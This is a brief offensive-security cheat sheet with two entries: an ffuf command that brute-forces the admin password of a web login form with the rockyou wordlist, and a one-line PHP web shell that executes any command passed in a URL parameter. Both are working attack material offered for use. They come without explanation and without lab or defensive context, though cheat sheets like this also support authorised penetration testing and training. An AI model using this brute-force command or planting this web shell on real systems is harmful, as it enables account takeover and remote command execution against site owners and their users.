# Cheat Sheet

[← Go back to main page](./index.md)

## [ffuf](https://github.com/ffuf/ffuf)

### Simple login page

```sh
ffuf \
  -u https://website.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt:FUZZ  \
  -fr "Incorrect"
```
  
## Web shell

### PHP

```php
<?php echo system($_GET['cmd']); ?>
```
